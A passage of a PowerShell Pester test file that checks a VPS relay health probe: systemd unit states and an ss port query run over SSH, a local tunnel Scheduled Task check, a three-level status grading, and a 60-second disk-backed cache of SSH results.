        $result.PortState | Should -BeNullOrEmpty
        $result.Detail | Should -Match '2 status line'
        Should -Invoke Invoke-SshCommand -ModuleName vps -Times 2 -Exactly
    }

    It 'a garbled reply on BOTH the first attempt and the retry stays fully unknown after exactly 2 SSH calls, never a mis-aligned guess' {
        Mock Invoke-SshCommand -ModuleName vps -MockWith {
            [pscustomobject]@{ TimedOut = $false; OutputLines = @('active', 'active', 'active'); Detail = $null }
        }

        $result = InModuleScope vps {
            Test-SmoothRelayHealth -SshHost 'vps.example.com' -SshUser 'church' -SshKeyPath 'C:\keys\id_ed25519' -SshPort 22 -RelayPort 8890
        }

        $result.UnitStates | ForEach-Object { $_.State | Should -BeNullOrEmpty }
        $result.PortState | Should -BeNullOrEmpty
        Should -Invoke Invoke-SshCommand -ModuleName vps -Times 2 -Exactly
    }

    It 'a garbled first reply followed by a clean aligned retry resolves both UnitStates and PortState from the RETRY, exactly 2 SSH calls' {
        $script:vpsPortRetryCallCount = 0
        Mock Invoke-SshCommand -ModuleName vps -MockWith {
            $script:vpsPortRetryCallCount++
            if ($script:vpsPortRetryCallCount -eq 1) {
                return [pscustomobject]@{ TimedOut = $false; OutputLines = @('active', 'active'); Detail = $null }
            }
            return [pscustomobject]@{ TimedOut = $false; OutputLines = @('active', 'active', 'active', '---', 'LISTEN 0 128 0.0.0.0:8890 0.0.0.0:*'); Detail = $null }
        }

        $result = InModuleScope vps {
            Test-SmoothRelayHealth -SshHost 'vps.example.com' -SshUser 'church' -SshKeyPath 'C:\keys\id_ed25519' -SshPort 22 -RelayPort 8890
        }

        $result.UnitStates | ForEach-Object { $_.State | Should -Be 'active' }
        $result.PortState | Should -Be 'open'
        Should -Invoke Invoke-SshCommand -ModuleName vps -Times 2 -Exactly
    }

    It 'no -RelayPort supplied (the srt path''s SSH leg) -> the remote command carries no separator and no ss call, exactly the pre-260809-oc4-third-round shape' {
        Mock Invoke-SshCommand -ModuleName vps -MockWith {
            [pscustomobject]@{ TimedOut = $false; OutputLines = @('active', 'active', 'active'); Detail = $null }
        }

        InModuleScope vps {
            Test-SmoothRelayHealth -SshHost 'vps.example.com' -SshUser 'church' -SshKeyPath 'C:\keys\id_ed25519' -SshPort 22 | Out-Null
        }

        Should -Invoke Invoke-SshCommand -ModuleName vps -Times 1 -Exactly -ParameterFilter {
            $remoteCommand = $ArgumentList[$ArgumentList.Count - 1]
            ($remoteCommand -eq 'systemctl is-active smooth-ingest-tcp.service smooth-youtube@lv.service smooth-youtube@ru.service') -and
            ($remoteCommand -notmatch 'ss -Ht') -and
            ($remoteCommand -notmatch '---')
        }
    }

    It '-RelayPort supplied (the tcp path) -> the remote command chains systemctl, the separator, then ss filtered on that exact port' {
        Mock Invoke-SshCommand -ModuleName vps -MockWith {
            [pscustomobject]@{ TimedOut = $false; OutputLines = @('active', 'active', 'active', '---', 'LISTEN 0 128 0.0.0.0:8890 0.0.0.0:*'); Detail = $null }
        }

        InModuleScope vps {
            Test-SmoothRelayHealth -SshHost 'vps.example.com' -SshUser 'church' -SshKeyPath 'C:\keys\id_ed25519' -SshPort 22 -RelayPort 8890 | Out-Null
        }

        Should -Invoke Invoke-SshCommand -ModuleName vps -Times 1 -Exactly -ParameterFilter {
            $remoteCommand = $ArgumentList[$ArgumentList.Count - 1]
            $remoteCommand -eq "systemctl is-active smooth-ingest-tcp.service smooth-youtube@lv.service smooth-youtube@ru.service; echo ---; ss -Htan '( sport = :8890 )'"
        }
    }
}

Describe 'Test-LocalTunnelProcessAlive (D-07, local church-PC tunnel-alive leg)' -Tag 'Quick' {

    BeforeEach {
        Remove-Module vps -ErrorAction SilentlyContinue
        Import-Module $script:VpsProbeModulePath -Force
    }

    AfterEach {
        Remove-Module vps -ErrorAction SilentlyContinue
    }

    It 'reports Running=$true when the GaplessTcpRelayTunnel Scheduled Task state is Running' {
        Mock Get-ScheduledTask -ModuleName vps { [pscustomobject]@{ State = 'Running' } }

        $result = InModuleScope vps { Test-LocalTunnelProcessAlive }

        $result.Running | Should -BeTrue
    }

    It 'reports Running=$false when the Scheduled Task exists but is not Running' {
        Mock Get-ScheduledTask -ModuleName vps { [pscustomobject]@{ State = 'Ready' } }

        $result = InModuleScope vps { Test-LocalTunnelProcessAlive }

        $result.Running | Should -BeFalse
    }

    It 'reports Running=$null (never $false) when Get-ScheduledTask finds nothing' {
        Mock Get-ScheduledTask -ModuleName vps { $null }

        $result = InModuleScope vps { Test-LocalTunnelProcessAlive }

        $result.Running | Should -BeNullOrEmpty
        $result.Detail | Should -Not -BeNullOrEmpty
    }

    It 'reports Running=$null (never throws) when Get-ScheduledTask itself throws (cmdlet unavailable)' {
        Mock Get-ScheduledTask -ModuleName vps { throw 'Get-ScheduledTask: command not found' }

        { InModuleScope vps { Test-LocalTunnelProcessAlive } } | Should -Not -Throw
        $result = InModuleScope vps { Test-LocalTunnelProcessAlive }
        $result.Running | Should -BeNullOrEmpty
    }
}

Describe 'Invoke-Probe tcp-path leg selection (D-07/D-10, CHUR-02; redesigned 260809-oc4 third round -- Port is now piggybacked on the SSH leg, no active connect)' -Tag 'Quick' {

    BeforeAll {
        function New-VpsTcpPathTestConfig {
            [pscustomobject]@{
                RelayHost = '127.0.0.1'; RelayPort = 8890; RelayProtocol = 'tcp'
                ProbeVpsSshHost = 'vps.example.com'; ProbeVpsSshUser = 'church'
                ProbeVpsSshKeyPath = 'C:\keys\id_ed25519'; ProbeVpsSshPort = 22
            }
        }

        function Mock-VpsTcpPathHealthyLeg3 {
            param([string] $PortState = 'open')
            Mock Test-SmoothRelayHealth -ModuleName vps {
                [pscustomobject]@{
                    UnitStates = @(
                        [pscustomobject]@{ UnitName = 'smooth-ingest-tcp.service'; State = 'active' }
                        [pscustomobject]@{ UnitName = 'smooth-youtube@lv.service'; State = 'active' }
                        [pscustomobject]@{ UnitName = 'smooth-youtube@ru.service'; State = 'active' }
                    )
                    PortState  = $PortState
                    Detail     = $null
                }
            }.GetNewClosure()
            Mock Get-Command -ModuleName vps { [pscustomobject]@{ Name = 'ssh.exe' } } -ParameterFilter { $Name -eq 'ssh.exe' }
        }
    }

    BeforeEach {
        Remove-Module vps -ErrorAction SilentlyContinue
        Import-Module $script:VpsProbeModulePath -Force
    }

    AfterEach {
        Remove-Module vps -ErrorAction SilentlyContinue
    }

    It 'RelayProtocol=tcp reads Port via the SSH-piggybacked leg (Test-SmoothRelayHealth -RelayPort), never Test-SrtInductionReachability' {
        Mock-VpsTcpPathHealthyLeg3
        Mock Test-SrtInductionReachability -ModuleName vps { [pscustomobject]@{ Reachable = $true; LatencyMilliseconds = 3.0; Detail = $null } }
        Mock Test-LocalTunnelProcessAlive -ModuleName vps { [pscustomobject]@{ Running = $true; Detail = $null } }

        $result = Invoke-Probe -Config (New-VpsTcpPathTestConfig)

        $result.status | Should -Be 'ok'
        ($result.metrics | Where-Object { $_.label -eq 'Port' }).value | Should -Be 'open'
        Should -Invoke Test-SmoothRelayHealth -ModuleName vps -Times 1 -Exactly -ParameterFilter { $RelayPort -eq 8890 }
        Should -Invoke Test-SrtInductionReachability -ModuleName vps -Times 0 -Exactly
    }

    It 'RelayProtocol=tcp never adds a Latency metric row -- the active TCP connect (and the latency it measured) was removed entirely (YAGNI, not one of the five fixed rows)' {
        Mock-VpsTcpPathHealthyLeg3
        Mock Test-LocalTunnelProcessAlive -ModuleName vps { [pscustomobject]@{ Running = $true; Detail = $null } }

        $result = Invoke-Probe -Config (New-VpsTcpPathTestConfig)

        ($result.metrics | Where-Object { $_.label -eq 'Latency' }) | Should -BeNullOrEmpty
    }

    It 'RelayProtocol=tcp + tunnel task Running -> a Tunnel metric row with value "running"' {
        Mock-VpsTcpPathHealthyLeg3
        Mock Test-LocalTunnelProcessAlive -ModuleName vps { [pscustomobject]@{ Running = $true; Detail = $null } }

        $result = Invoke-Probe -Config (New-VpsTcpPathTestConfig)

        ($result.metrics | Where-Object { $_.label -eq 'Tunnel' }).value | Should -Be 'running'
    }

    It 'RelayProtocol=tcp + tunnel task absent (Running=$null) -> a Tunnel metric row with value "unknown", never a fabricated "not running"' {
        Mock-VpsTcpPathHealthyLeg3
        Mock Test-LocalTunnelProcessAlive -ModuleName vps { [pscustomobject]@{ Running = $null; Detail = 'not found' } }

        $result = Invoke-Probe -Config (New-VpsTcpPathTestConfig)

        ($result.metrics | Where-Object { $_.label -eq 'Tunnel' }).value | Should -Be 'unknown'
    }

    It 'RelayProtocol=srt (break-glass) -> Test-LocalTunnelProcessAlive is never invoked and the Tunnel metric reads "not applicable"' {
        Mock Test-SrtInductionReachability -ModuleName vps { [pscustomobject]@{ Reachable = $true; LatencyMilliseconds = 3.0; Detail = $null } }
        Mock Test-LocalTunnelProcessAlive -ModuleName vps { [pscustomobject]@{ Running = $true; Detail = $null } }

        $config = [pscustomobject]@{
            RelayHost = '127.0.0.1'; RelayPort = 8890; RelayProtocol = 'srt'
            ProbeVpsSshHost = ''; ProbeVpsSshUser = ''; ProbeVpsSshKeyPath = ''
        }

        $result = Invoke-Probe -Config $config

        Should -Invoke Test-LocalTunnelProcessAlive -ModuleName vps -Times 0 -Exactly
        ($result.metrics | Where-Object { $_.label -eq 'Tunnel' }).value | Should -Be 'not applicable'
    }

    It 'RelayProtocol=srt (break-glass) always calls Test-SmoothRelayHealth with RelayPort=0 -- the ss port check is tcp-path only, a TCP query against the srt path''s UDP port would be meaningless' {
        Mock Test-SrtInductionReachability -ModuleName vps { [pscustomobject]@{ Reachable = $true; LatencyMilliseconds = 3.0; Detail = $null } }
        Mock Test-SmoothRelayHealth -ModuleName vps {
            [pscustomobject]@{
                UnitStates = @(
                    [pscustomobject]@{ UnitName = 'smooth-ingest-tcp.service'; State = 'active' }
                    [pscustomobject]@{ UnitName = 'smooth-youtube@lv.service'; State = 'active' }
                    [pscustomobject]@{ UnitName = 'smooth-youtube@ru.service'; State = 'active' }
                )
                PortState  = $null
                Detail     = $null
            }
        }
        Mock Get-Command -ModuleName vps { [pscustomobject]@{ Name = 'ssh.exe' } } -ParameterFilter { $Name -eq 'ssh.exe' }

        $config = [pscustomobject]@{
            RelayHost = '127.0.0.1'; RelayPort = 8890; RelayProtocol = 'srt'
            ProbeVpsSshHost = 'vps.example.com'; ProbeVpsSshUser = 'church'
            ProbeVpsSshKeyPath = 'C:\keys\id_ed25519'; ProbeVpsSshPort = 22
        }

        Invoke-Probe -Config $config | Out-Null

        Should -Invoke Test-SmoothRelayHealth -ModuleName vps -Times 1 -Exactly -ParameterFilter { $RelayPort -eq 0 }
    }
}

Describe 'Invoke-Probe status fold (D-09, CHUR-02 three-level grading; redesigned 260809-oc4 third round -- Port is now piggybacked on the SSH leg on the tcp path)' -Tag 'Quick' {

    BeforeAll {
        # Shared fixture builder: tcp path, Port state controllable via the SSH-leg mock,
        # three units + tunnel each independently overridable so every behavior bullet can
        # isolate exactly one failing leg at a time. Defined in BeforeAll (not the bare
        # Describe body) so Pester v5's Run phase -- not just Discovery -- can see these
        # functions.
        function New-VpsHealthFoldConfig {
            [pscustomobject]@{
                RelayHost = '127.0.0.1'; RelayPort = 8890; RelayProtocol = 'tcp'
                ProbeVpsSshHost = 'vps.example.com'; ProbeVpsSshUser = 'church'
                ProbeVpsSshKeyPath = 'C:\keys\id_ed25519'; ProbeVpsSshPort = 22
            }
        }

        function Set-VpsHealthFoldMocks {
            param(
                # Deliberately untyped (not [string]) -- a [string]-typed parameter
                # silently coerces a passed $null into '' during PowerShell parameter
                # binding (even with [AllowNull()], which only waives the null-check, not
                # the type coercion), which would corrupt the "unresolved" test case below.
                [AllowNull()] $PortState = 'open',
                [AllowNull()] $IngestState = 'active',
                [AllowNull()] $YouTubeLvState = 'active',
                [AllowNull()] $YouTubeRuState = 'active',
                [AllowNull()] $TunnelRunning = $true,
                [bool] $SshExeAvailable = $true
            )

            Mock Test-LocalTunnelProcessAlive -ModuleName vps {
                [pscustomobject]@{ Running = $TunnelRunning; Detail = (($null -eq $TunnelRunning) ? 'Scheduled Task not found' : $null) }
            }.GetNewClosure()

            Mock Get-Command -ModuleName vps {
                $SshExeAvailable ? [pscustomobject]@{ Name = 'ssh.exe' } : $null
            }.GetNewClosure() -ParameterFilter { $Name -eq 'ssh.exe' }

            Mock Test-SmoothRelayHealth -ModuleName vps {
                [pscustomobject]@{
                    UnitStates = @(
                        [pscustomobject]@{ UnitName = 'smooth-ingest-tcp.service'; State = $IngestState }
                        [pscustomobject]@{ UnitName = 'smooth-youtube@lv.service'; State = $YouTubeLvState }
                        [pscustomobject]@{ UnitName = 'smooth-youtube@ru.service'; State = $YouTubeRuState }
                    )
                    PortState  = $PortState
                    Detail     = $null
                }
            }.GetNewClosure()
        }
    }

    BeforeEach {
        Remove-Module vps -ErrorAction SilentlyContinue
        Import-Module $script:VpsProbeModulePath -Force
    }

    AfterEach {
        Remove-Module vps -ErrorAction SilentlyContinue
    }

    It 'Port state "closed" -> status down, regardless of what any other leg reports' {
        Set-VpsHealthFoldMocks -PortState 'closed' -IngestState 'active' -YouTubeLvState 'active' -YouTubeRuState 'active' -TunnelRunning $true

        $result = Invoke-Probe -Config (New-VpsHealthFoldConfig)

        $result.status | Should -Be 'down'
        ($result.metrics | Where-Object { $_.label -eq 'Port' }).value | Should -Be 'closed'
    }

    It 'Port state "open", all three units active, tunnel running -> status ok' {
        Set-VpsHealthFoldMocks

        $result = Invoke-Probe -Config (New-VpsHealthFoldConfig)

        $result.status | Should -Be 'ok'
    }

    It 'Port state "in use" (an ESTABLISHED session, no LISTEN) is healthy -- status ok, same as "open" (260809-oc4)' {
        Set-VpsHealthFoldMocks -PortState 'in use'

        $result = Invoke-Probe -Config (New-VpsHealthFoldConfig)

        $result.status | Should -Be 'ok'
        ($result.metrics | Where-Object { $_.label -eq 'Port' }).value | Should -Be 'in use'
    }

    It 'Port state "open", ingest unit inactive -> status down' {
        Set-VpsHealthFoldMocks -IngestState 'inactive'

        $result = Invoke-Probe -Config (New-VpsHealthFoldConfig)

        $result.status | Should -Be 'down'
    }

    It 'Port state "open", smooth-youtube@lv.service inactive, ingest active -> status degraded' {
        Set-VpsHealthFoldMocks -YouTubeLvState 'inactive'

        $result = Invoke-Probe -Config (New-VpsHealthFoldConfig)

        $result.status | Should -Be 'degraded'
    }

    It 'the SSH check fails/times out (all unit states AND Port state unresolved) -> status degraded, never down (D-09 precedence: an unresolved Port never proves down)' {
        Set-VpsHealthFoldMocks -PortState $null -IngestState $null -YouTubeLvState $null -YouTubeRuState $null

        $result = Invoke-Probe -Config (New-VpsHealthFoldConfig)

        $result.status | Should -Be 'degraded'
        ($result.metrics | Where-Object { $_.label -eq 'Port' }).value | Should -Be 'unknown'
    }

    It 'SSH not configured -> status ok, detail names the absence, three unit metrics AND Port all read "not configured"' {
        Set-VpsHealthFoldMocks

        $config = New-VpsHealthFoldConfig
        $config.ProbeVpsSshHost = ''
        $config.ProbeVpsSshUser = ''
        $config.ProbeVpsSshKeyPath = ''

        $result = Invoke-Probe -Config $config

        $result.status | Should -Be 'ok'
        $result.detail | Should -Match 'SSH not configured'
        ($result.metrics | Where-Object { $_.label -eq 'Ingest' }).value | Should -Be 'not configured'
        ($result.metrics | Where-Object { $_.label -eq 'YouTube LV' }).value | Should -Be 'not configured'
        ($result.metrics | Where-Object { $_.label -eq 'YouTube RU' }).value | Should -Be 'not configured'
        ($result.metrics | Where-Object { $_.label -eq 'Port' }).value | Should -Be 'not configured'
    }

    It 'ssh.exe absent from PATH -> status ok, detail names the absence, three unit metrics AND Port all read "unknown"' {
        Set-VpsHealthFoldMocks -SshExeAvailable $false

        $result = Invoke-Probe -Config (New-VpsHealthFoldConfig)

        $result.status | Should -Be 'ok'
        $result.detail | Should -Match 'ssh\.exe'
        ($result.metrics | Where-Object { $_.label -eq 'Ingest' }).value | Should -Be 'unknown'
        ($result.metrics | Where-Object { $_.label -eq 'YouTube LV' }).value | Should -Be 'unknown'
        ($result.metrics | Where-Object { $_.label -eq 'YouTube RU' }).value | Should -Be 'unknown'
        ($result.metrics | Where-Object { $_.label -eq 'Port' }).value | Should -Be 'unknown'
    }

    It 'every case above returns exactly five check metrics, labels in order Ingest/YouTube LV/YouTube RU/Tunnel/Port -- including the down case' {
        Set-VpsHealthFoldMocks -PortState 'closed'

        $downResult = Invoke-Probe -Config (New-VpsHealthFoldConfig)
        $downLabels = @($downResult.metrics | Select-Object -First 5 -ExpandProperty label)
        $downLabels | Should -Be @('Ingest', 'YouTube LV', 'YouTube RU', 'Tunnel', 'Port')

        Set-VpsHealthFoldMocks
        $okResult = Invoke-Probe -Config (New-VpsHealthFoldConfig)
        $okLabels = @($okResult.metrics | Select-Object -First 5 -ExpandProperty label)
        $okLabels | Should -Be @('Ingest', 'YouTube LV', 'YouTube RU', 'Tunnel', 'Port')
    }
}

Describe 'Get-SshLegCacheFilePath (260809-oc4)' -Tag 'Quick' {

    BeforeEach {
        Remove-Module vps -ErrorAction SilentlyContinue
        Import-Module $script:VpsProbeModulePath -Force
    }

    AfterEach {
        Remove-Module vps -ErrorAction SilentlyContinue
    }

    It 'returns the parent directory of a non-blank StateFilePath joined with vps-probe-ssh-cache.json' {
        $stateFilePath = Join-Path $TestDrive 'state\offset.json'
        $config = [pscustomobject]@{ StateFilePath = $stateFilePath }

        $cacheFilePath = InModuleScope vps -ArgumentList $config {
            param($config)
            Get-SshLegCacheFilePath -Config $config
        }

        $cacheFilePath | Should -Be (Join-Path (Split-Path -Parent $stateFilePath) 'vps-probe-ssh-cache.json')
    }

    It 'returns $null when Config has no StateFilePath property at all (a partial fixture degrades to unthrottled, never a crash under Set-StrictMode)' {
        $config = [pscustomobject]@{ RelayHost = '127.0.0.1' }

        $cacheFilePath = InModuleScope vps -ArgumentList $config {
            param($config)
            Get-SshLegCacheFilePath -Config $config
        }

        $cacheFilePath | Should -BeNullOrEmpty
    }

    It 'returns $null when StateFilePath is blank' {
        $config = [pscustomobject]@{ StateFilePath = '' }

        $cacheFilePath = InModuleScope vps -ArgumentList $config {
            param($config)
            Get-SshLegCacheFilePath -Config $config
        }

        $cacheFilePath | Should -BeNullOrEmpty
    }
}

Describe 'SSH-leg 60-second throttle with disk-backed cache (260809-oc4, extended third round for PortState)' -Tag 'Quick' {

    BeforeAll {
        function New-VpsThrottleTestConfig {
            param([Parameter(Mandatory)] [string] $StateFilePath)
            [pscustomobject]@{
                RelayHost = '127.0.0.1'; RelayPort = 8890; RelayProtocol = 'tcp'
                ProbeVpsSshHost = 'vps.example.com'; ProbeVpsSshUser = 'church'
                ProbeVpsSshKeyPath = 'C:\keys\id_ed25519'; ProbeVpsSshPort = 22
                StateFilePath = $StateFilePath
            }
        }

        function Set-VpsThrottleTestLegMocks {
            Mock Test-LocalTunnelProcessAlive -ModuleName vps { [pscustomobject]@{ Running = $true; Detail = $null } }
            Mock Get-Command -ModuleName vps { [pscustomobject]@{ Name = 'ssh.exe' } } -ParameterFilter { $Name -eq 'ssh.exe' }
        }

        function Mock-VpsThrottleTestSshCheck {
            param(
                # Deliberately untyped (not [string]) -- a [string]-typed parameter
                # silently coerces a passed $null into '' during PowerShell parameter
                # binding (even with [AllowNull()], which only waives the null-check, not
                # the type coercion), which would corrupt the "unresolved" test case below.
                [AllowNull()] $IngestState = 'active',
                [AllowNull()] $YouTubeLvState = 'active',
                [AllowNull()] $YouTubeRuState = 'active',
                [AllowNull()] $PortState = 'open',
                [AllowNull()] $Detail = $null
            )
            Mock Test-SmoothRelayHealth -ModuleName vps {
                [pscustomobject]@{
                    UnitStates = @(
                        [pscustomobject]@{ UnitName = 'smooth-ingest-tcp.service'; State = $IngestState }
                        [pscustomobject]@{ UnitName = 'smooth-youtube@lv.service'; State = $YouTubeLvState }
                        [pscustomobject]@{ UnitName = 'smooth-youtube@ru.service'; State = $YouTubeRuState }
                    )
                    PortState  = $PortState
                    Detail     = $Detail
                }
            }.GetNewClosure()
        }

        function New-VpsThrottleTestStateDirectory {
            # $TestDrive is shared across every It in this Describe (Pester recreates it
            # once per container run, not per It) -- each test gets its OWN subdirectory
            # so one test's cache write can never leak into another test's cadence count.
            $stateDirectory = Join-Path $TestDrive ([Guid]::NewGuid().ToString())
            New-Item -ItemType Directory -Path $stateDirectory -Force | Out-Null
            return $stateDirectory
        }
    }

    BeforeEach {
        Remove-Module vps -ErrorAction SilentlyContinue
        Import-Module $script:VpsProbeModulePath -Force
    }

    AfterEach {
        Remove-Module vps -ErrorAction SilentlyContinue
    }

    It 'a Config with no StateFilePath invokes Test-SmoothRelayHealth exactly 2 times across 2 consecutive Invoke-Probe calls (existing unthrottled behavior preserved)' {
        Set-VpsThrottleTestLegMocks
        Mock-VpsThrottleTestSshCheck

        $config = [pscustomobject]@{
            RelayHost = '127.0.0.1'; RelayPort = 8890; RelayProtocol = 'tcp'
            ProbeVpsSshHost = 'vps.example.com'; ProbeVpsSshUser = 'church'
            ProbeVpsSshKeyPath = 'C:\keys\id_ed25519'; ProbeVpsSshPort = 22
        }

        Invoke-Probe -Config $config | Out-Null
        Invoke-Probe -Config $config | Out-Null

        Should -Invoke Test-SmoothRelayHealth -ModuleName vps -Times 2 -Exactly
    }

    It 'no cache file yet: runs the SSH leg, writes the cache, and the first result carries no observation-age note' {
        Set-VpsThrottleTestLegMocks
        Mock-VpsThrottleTestSshCheck

        $stateFilePath = Join-Path (New-VpsThrottleTestStateDirectory) 'offset.json'
        $config = New-VpsThrottleTestConfig -StateFilePath $stateFilePath

        $result = Invoke-Probe -Config $config

        $result.detail | Should -Not -Match 'observed \d+s ago'
        Test-Path -LiteralPath (Join-Path (Split-Path -Parent $stateFilePath) 'vps-probe-ssh-cache.json') | Should -BeTrue
    }

    It 'two consecutive Invoke-Probe calls with a cache-capable Config invoke Test-SmoothRelayHealth exactly 1 time, and both results carry identical unit AND Port metric values' {
        Set-VpsThrottleTestLegMocks
        Mock-VpsThrottleTestSshCheck -YouTubeRuState 'inactive' -PortState 'in use'

        $stateFilePath = Join-Path (New-VpsThrottleTestStateDirectory) 'offset.json'
        $config = New-VpsThrottleTestConfig -StateFilePath $stateFilePath

        $firstResult = Invoke-Probe -Config $config
        $secondResult = Invoke-Probe -Config $config

        Should -Invoke Test-SmoothRelayHealth -ModuleName vps -Times 1 -Exactly
        ($firstResult.metrics | Where-Object { $_.label -eq 'YouTube RU' }).value | Should -Be 'inactive'
        ($secondResult.metrics | Where-Object { $_.label -eq 'YouTube RU' }).value | Should -Be 'inactive'
        ($firstResult.metrics | Where-Object { $_.label -eq 'Port' }).value | Should -Be 'in use'
        ($secondResult.metrics | Where-Object { $_.label -eq 'Port' }).value | Should -Be 'in use'
    }

    It 'the cache file sits beside StateFilePath after one poll, and a sibling state/probes/ directory gains no new *.json file' {
        Set-VpsThrottleTestLegMocks
        Mock-VpsThrottleTestSshCheck

        $stateDirectory = New-VpsThrottleTestStateDirectory
        $probesDirectory = Join-Path $stateDirectory 'probes'
        New-Item -ItemType Directory -Path $probesDirectory -Force | Out-Null
        $stateFilePath = Join-Path $stateDirectory 'offset.json'
        $config = New-VpsThrottleTestConfig -StateFilePath $stateFilePath

        Invoke-Probe -Config $config | Out-Null

        Test-Path -LiteralPath (Join-Path $stateDirectory 'vps-probe-ssh-cache.json') | Should -BeTrue
        @(Get-ChildItem -LiteralPath $probesDirectory -Filter '*.json' -File) | Should -HaveCount 0
    }

    It 'a poll whose unit/Port states came from cache carries a detail matching "observed \d+s ago"; a fresh poll carries no such note' {
        Set-VpsThrottleTestLegMocks
        Mock-VpsThrottleTestSshCheck

        $stateFilePath = Join-Path (New-VpsThrottleTestStateDirectory) 'offset.json'
        $config = New-VpsThrottleTestConfig -StateFilePath $stateFilePath

        $freshResult = Invoke-Probe -Config $config
        $cachedResult = Invoke-Probe -Config $config

        $freshResult.detail | Should -Not -Match 'observed \d+s ago'
        $cachedResult.detail | Should -Match 'observed \d+s ago'
    }

    It 'an expired cache (observed 120 seconds ago) is never reused -- the SSH leg runs again' {
        Set-VpsThrottleTestLegMocks
        Mock-VpsThrottleTestSshCheck

        $stateDirectory = New-VpsThrottleTestStateDirectory
        $stateFilePath = Join-Path $stateDirectory 'offset.json'
        $config = New-VpsThrottleTestConfig -StateFilePath $stateFilePath

        $nowMonotonicSeconds = InModuleScope vps { Get-MonotonicSeconds }
        $expiredCachePayload = [ordered]@{
            schemaVersion              = 2
            observedAtMonotonicSeconds = ($nowMonotonicSeconds - 120)
            unitNames                  = @('smooth-ingest-tcp.service', 'smooth-youtube@lv.service', 'smooth-youtube@ru.service')
            unitStates                 = @(
                [ordered]@{ unitName = 'smooth-ingest-tcp.service'; state = 'active' }
                [ordered]@{ unitName = 'smooth-youtube@lv.service'; state = 'active' }
                [ordered]@{ unitName = 'smooth-youtube@ru.service'; state = 'active' }
            )
            portState                  = 'open'
            detail                     = $null
        }
        $cacheFilePath = Join-Path $stateDirectory 'vps-probe-ssh-cache.json'
        ($expiredCachePayload | ConvertTo-Json -Depth 4) | Set-Content -LiteralPath $cacheFilePath

        Invoke-Probe -Config $config | Out-Null

        Should -Invoke Test-SmoothRelayHealth -ModuleName vps -Times 1 -Exactly
    }

    It 'a future-dated cache (negative age -- the Stopwatch origin resets on reboot) is never reused -- the SSH leg runs again' {
        Set-VpsThrottleTestLegMocks
        Mock-VpsThrottleTestSshCheck

        $stateDirectory = New-VpsThrottleTestStateDirectory
        $stateFilePath = Join-Path $stateDirectory 'offset.json'
        $config = New-VpsThrottleTestConfig -StateFilePath $stateFilePath

        $nowMonotonicSeconds = InModuleScope vps { Get-MonotonicSeconds }
        $futureCachePayload = [ordered]@{
            schemaVersion              = 2
            observedAtMonotonicSeconds = ($nowMonotonicSeconds + 500)
            unitNames                  = @('smooth-ingest-tcp.service', 'smooth-youtube@lv.service', 'smooth-youtube@ru.service')
            unitStates                 = @(
                [ordered]@{ unitName = 'smooth-ingest-tcp.service'; state = 'active' }
                [ordered]@{ unitName = 'smooth-youtube@lv.service'; state = 'active' }
                [ordered]@{ unitName = 'smooth-youtube@ru.service'; state = 'active' }
            )
            portState                  = 'open'
            detail                     = $null
        }
        $cacheFilePath = Join-Path $stateDirectory 'vps-probe-ssh-cache.json'
        ($futureCachePayload | ConvertTo-Json -Depth 4) | Set-Content -LiteralPath $cacheFilePath

        Invoke-Probe -Config $config | Out-Null

        Should -Invoke Test-SmoothRelayHealth -ModuleName vps -Times 1 -Exactly
    }

    It 'a cache whose stored unit-name set does not match the current $script:SmoothRelayUnitNames is discarded -- the SSH leg runs again' {
        Set-VpsThrottleTestLegMocks
        Mock-VpsThrottleTestSshCheck

        $stateDirectory = New-VpsThrottleTestStateDirectory
        $stateFilePath = Join-Path $stateDirectory 'offset.json'
        $config = New-VpsThrottleTestConfig -StateFilePath $stateFilePath

        # An arbitrary stand-in mismatched set, deliberately NOT the superseded
        # hyphen-before-channel spelling (260809-oc4's own spelling gate greps this file
        # too) -- any set that differs from the runtime $script:SmoothRelayUnitNames
        # exercises the same discard-and-retry path.
        $nowMonotonicSeconds = InModuleScope vps { Get-MonotonicSeconds }
        $mismatchedNameCachePayload = [ordered]@{
            schemaVersion              = 2
            observedAtMonotonicSeconds = $nowMonotonicSeconds
            unitNames                  = @('smooth-ingest-tcp.service', 'some-other-relay-channel-a.service', 'some-other-relay-channel-b.service')
            unitStates                 = @(
                [ordered]@{ unitName = 'smooth-ingest-tcp.service'; state = 'active' }
                [ordered]@{ unitName = 'some-other-relay-channel-a.service'; state = 'active' }
                [ordered]@{ unitName = 'some-other-relay-channel-b.service'; state = 'active' }
            )
            portState                  = 'open'
            detail                     = $null
        }
        $cacheFilePath = Join-Path $stateDirectory 'vps-probe-ssh-cache.json'
        ($mismatchedNameCachePayload | ConvertTo-Json -Depth 4) | Set-Content -LiteralPath $cacheFilePath

        Invoke-Probe -Config $config | Out-Null

        Should -Invoke Test-SmoothRelayHealth -ModuleName vps -Times 1 -Exactly
    }

    It 'a cache written by the PRE-260809-oc4-third-round module version (schemaVersion=1, no portState field) is discarded automatically -- the SSH leg runs again' {
        Set-VpsThrottleTestLegMocks
        Mock-VpsThrottleTestSshCheck

        $stateDirectory = New-VpsThrottleTestStateDirectory
        $stateFilePath = Join-Path $stateDirectory 'offset.json'
        $config = New-VpsThrottleTestConfig -StateFilePath $stateFilePath

        $nowMonotonicSeconds = InModuleScope vps { Get-MonotonicSeconds }
        $preRedesignCachePayload = [ordered]@{
            schemaVersion              = 1
            observedAtMonotonicSeconds = $nowMonotonicSeconds
            unitNames                  = @('smooth-ingest-tcp.service', 'smooth-youtube@lv.service', 'smooth-youtube@ru.service')
            unitStates                 = @(
                [ordered]@{ unitName = 'smooth-ingest-tcp.service'; state = 'active' }
                [ordered]@{ unitName = 'smooth-youtube@lv.service'; state = 'active' }
                [ordered]@{ unitName = 'smooth-youtube@ru.service'; state = 'active' }
            )
            detail                     = $null
        }
        $cacheFilePath = Join-Path $stateDirectory 'vps-probe-ssh-cache.json'
        ($preRedesignCachePayload | ConvertTo-Json -Depth 4) | Set-Content -LiteralPath $cacheFilePath

        Invoke-Probe -Config $config | Out-Null

        Should -Invoke Test-SmoothRelayHealth -ModuleName vps -Times 1 -Exactly
    }

    It 'an empty cache file is discarded, the SSH leg runs again, nothing throws' {
        Set-VpsThrottleTestLegMocks
        Mock-VpsThrottleTestSshCheck

        $stateDirectory = New-VpsThrottleTestStateDirectory
        $stateFilePath = Join-Path $stateDirectory 'offset.json'
        $config = New-VpsThrottleTestConfig -StateFilePath $stateFilePath
        $cacheFilePath = Join-Path $stateDirectory 'vps-probe-ssh-cache.json'
        Set-Content -LiteralPath $cacheFilePath -Value ''

        { Invoke-Probe -Config $config } | Should -Not -Throw
        Should -Invoke Test-SmoothRelayHealth -ModuleName vps -Times 1 -Exactly
    }

